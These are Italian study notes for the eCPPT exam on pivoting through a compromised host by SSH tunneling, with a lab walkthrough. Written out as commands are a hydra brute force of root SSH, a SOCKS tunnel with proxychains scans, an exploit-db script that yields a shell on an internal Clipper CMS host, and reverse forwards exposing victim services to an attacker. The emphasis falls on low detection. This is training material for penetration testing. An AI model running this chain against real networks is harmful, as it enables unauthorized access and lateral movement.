# 014 — Pivoting via SSH Tunneling (Lateral Movement & Pivoting)

> **Modulo:** Lateral Movement & Pivoting · **Video:** 14/16
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [014_Pivoting via SSH Tunneling.txt](014_Pivoting via SSH Tunneling.txt) · [014_Pivoting via SSH Tunneling.srt](014_Pivoting via SSH Tunneling.srt)

## Concetti chiave

- **SSH tunneling** (aka SSH port forwarding) = uso di SSH per creare **tunnel cifrati** che trasportano traffico di rete arbitrario.
- Tre varianti, tutte rilevanti per pivoting:
  - **Local port forwarding** (`-L`): porta locale sull'attaccante → porta su host remoto raggiungibile dal pivot. È l'equivalente "nativo OS" del `portfwd` di Metasploit.
  - **Remote port forwarding** (`-R`): porta sul server SSH remoto → porta locale dell'attaccante. Utile per "reverse" / persistence quando la vittima può raggiungere noi.
  - **Dynamic port forwarding** (`-D`): apre un **SOCKS proxy** sul lato client, che inoltra dinamicamente tutto il traffico via SSH al pivot. È la modalità **più potente**, equivalente "OS-native" del `socks_proxy` di Metasploit.
- **Prerequisito**: serve un host pivot con **SSH server attivo** e credenziali valide (tipicamente Linux; possibile su Windows con OpenSSH).
- Nel lab Alexis brute-forza SSH (`hydra` con seclists/rockyou-40) su victim1, ottiene root, scopre rete interna (`ifconfig`), e usa **`ssh -D 9050 root@victim1`** per aprire un SOCKS sul Kali → poi `proxychains nmap/curl/python exploit` verso victim2 (Clipper CMS).

## Spiegazione approfondita

### Perché SSH tunneling per pivoting
SSH è un protocollo legittimo, cifrato e quasi sempre permesso in uscita: ne fa lo strumento ideale per pivotare attraverso un host compromesso senza bisogno di payload Metasploit. Inoltre tutto avviene **a livello OS**, senza framework: niente staged payloads, niente AV detection.

### Topologia generale
```
                 ┌─────────────────────────────┐
                 │   RETE INTERNA              │
[Kali] ─SSH───>  │  [VICTIM1 / PIVOT]          │
                 │   eth0: pubblico            │
                 │   eth1: 192.168.x.2 ─────►  │   [VICTIM2]
                 │                             │   192.168.x.3
                 │                             │   :80 web, :3306 mysql
                 └─────────────────────────────┘
```

### Local port forwarding (`-L`)
```
ssh -L <local_port>:<target_host>:<target_port> <user>@<pivot>
```
- Apre `local_port` sul Kali.
- Connessioni a `127.0.0.1:<local_port>` vengono tunnellate via SSH fino al `pivot`, che le inoltra a `<target_host>:<target_port>` (visto dal pivot).
- Esempio: `ssh -L 8080:192.168.69.3:80 root@victim1` → `curl http://127.0.0.1:8080/` colpisce il web server interno.

### Remote port forwarding (`-R`)
```
ssh -R <remote_port>:<target_host>:<target_port> <user>@<attacker>
```
- Apre `remote_port` sul **server SSH dell'attaccante**.
- Connessioni lì vengono tunnellate **indietro** al client (la vittima), che le inoltra a `target_host:target_port` visto dalla sua prospettiva.
- Caso d'uso: la vittima ha SSH client uscente, non possiamo connetterci a lei → la vittima si "chiama indietro" e ci espone un servizio interno.

### Dynamic port forwarding (`-D`) — la stella del video
```
ssh -D <local_port> <user>@<pivot>
```
- Apre un **SOCKS proxy** (SOCKS4/5) su `127.0.0.1:<local_port>` del Kali.
- **Qualsiasi** connessione TCP fatta via quel SOCKS viene incapsulata in SSH e instradata dal pivot al suo destino reale.
- Equivalente OS-native del modulo `auxiliary/server/socks_proxy` di Metasploit, ma senza dover compromettere con MSF.
- Si combina con **`proxychains`** (porta default 9050 — allineata in `/etc/proxychains.conf`).

### Flag utili
| Flag | Significato |
|---|---|
| `-N` | No remote command (solo tunnel, niente shell) |
| `-f` | Background dopo l'auth |
| `-C` | Compressione |
| `-q` | Quiet |
| `-g` | Permetti ad host remoti di connettersi alle porte forwardate |

Esempio "fire and forget": `ssh -D 9050 -N -f root@victim1`.

### Lab walkthrough (riepilogo)
1. `ifconfig` su Kali → identifica subnet (Kali = `.2`, target pubblico = `.3`).
2. Nmap su target → solo SSH aperto.
3. Brute force SSH: `hydra -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-40.txt ssh://<ip>`.
4. SSH come `root` → `ifconfig` rivela seconda NIC (`eth1`) su rete interna.
5. Chiudi sessione, riapri con `-D`: `ssh -D 9050 root@victim1`.
6. `netstat -antp | grep 9050` per verificare il listener SOCKS locale.
7. Da Kali: `proxychains nmap -sT -Pn 192.168.69.3` → trova `:80` e `:3306`.
8. `proxychains curl http://192.168.69.3/` → identifica Clipper CMS.
9. `cp /usr/share/exploitdb/exploits/php/webapps/38730.py .`
10. `proxychains python 38730.py http://192.168.69.3/clipper admin password "id"` → reverse shell su victim2.

## Comandi & strumenti

| Comando | Scopo |
|---|---|
| `ssh -L 8080:10.0.0.5:80 user@pivot` | Local port forward (porta 8080 locale → 10.0.0.5:80 via pivot) |
| `ssh -R 9000:127.0.0.1:3389 user@attacker` | Remote port forward (espone RDP della vittima all'attaccante su 9000) |
| `ssh -D 9050 user@pivot` | Dynamic forwarding → SOCKS proxy locale su 9050 |
| `ssh -D 9050 -N -f user@pivot` | Stesso, in background, senza shell |
| `proxychains <cmd>` | Forza qualsiasi tool TCP attraverso il SOCKS |
| `hydra -l root -P <wordlist> ssh://<ip>` | Brute force credenziali SSH |
| `netstat -antp \| grep 9050` | Verifica listener SOCKS attivo |
| `cat /etc/proxychains.conf` | Verifica che `socks4 127.0.0.1 9050` sia configurato |

## Esempi pratici

```bash
# === 1. Foothold via brute force SSH ===
hydra -l root \
      -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-40.txt \
      ssh://192.168.141.3
# [22][ssh] host: 192.168.141.3   login: root   password: <found>

ssh root@192.168.141.3
# victim1 # ifconfig
# eth0: 192.168.141.3   (pubblico)
# eth1: 192.168.69.2/24 (interno)  ← nuova subnet!
exit

# === 2. Dynamic port forward (SOCKS) ===
ssh -D 9050 root@192.168.141.3
# [auth con la password trovata]

# In un altro terminale Kali:
netstat -antp | grep 9050       # listener SSH client su 9050
cat /etc/proxychains.conf | tail
# socks4  127.0.0.1 9050

# === 3. Uso del tunnel SOCKS ===
proxychains nmap -sT -Pn 192.168.69.3
# 80/tcp  open  http
# 3306/tcp open mysql

proxychains curl http://192.168.69.3/
# → Clipper CMS

cp /usr/share/exploitdb/exploits/php/webapps/38730.py .
proxychains python 38730.py http://192.168.69.3/clipper admin password "id"
# → shell remota su victim2 via SSH tunnel
```

```bash
# === Local port forward equivalente ===
# (singolo servizio: web di victim2 → :8080 sul Kali)
ssh -L 8080:192.168.69.3:80 root@192.168.141.3
curl http://127.0.0.1:8080/

# === Remote port forward (scenario reverse) ===
# Dal pivot compromesso, esponi il suo SSH interno sul Kali:
ssh -R 2222:192.168.69.3:22 attacker@kali_public_ip
# Sul Kali: ssh user@127.0.0.1 -p 2222 → arriva a victim2
```

## Punti d'attenzione per l'esame eCPPT

- **Memorizza le tre flag**: `-L` (Local), `-R` (Remote), `-D` (Dynamic/SOCKS). Domanda quasi garantita.
- **Direzione del forward**: con `-L` il client inizia la connessione locale; con `-R` è il server SSH a inizializzare l'inoltro al client.
- **`-D` apre un SOCKS** sul lato client SSH (=l'attaccante). Default usato nel lab: **9050** per allineamento con `proxychains`.
- **Combo obbligata con proxychains**: `proxychains nmap -sT -Pn <target>` — ricorda `-sT` (TCP connect) e `-Pn` (no ping), perché proxychains tunnellizza **solo TCP** (no ICMP, no UDP).
- **`-N -f`**: aprire un tunnel "puro" in background è OPSEC-friendly e non lascia una shell aperta.
- **Vantaggio vs Metasploit**: nessun framework, nessun payload, solo SSH legittimo → bassissima detection.
- **Prerequisito**: serve SSH server sul pivot **+ credenziali valide** (o chiave). Nel lab si arriva con un Hydra brute force di `root`.
- **Differenza con `portfwd` MSF**: SSH `-L` = identico concettualmente; SSH `-D` = identico a `socks_proxy` ma senza bisogno di session Meterpreter.
- **Multi-hop**: si possono incatenare (`ssh -J jump1,jump2 user@final`) o aprire più `-L` sullo stesso comando.
- **Limite**: `-D` SOCKS è TCP-only. Per UDP servono altri tool (es. `sshuttle`, `chisel`).

## Collegamenti con altri video

- Precedente: [[013_Pivoting with SOCKS Proxy]] — stessa idea ma via Metasploit.
- Prossimo: [[015_Pivoting with reGeorg]] — pivot quando hai **solo** una web shell senza privilegi.
- Port forwarding singolo via MSF: [[012_Pivoting & Port Forwarding with Metasploit]].
- Conclusione modulo: [[016_Course Conclusion]].
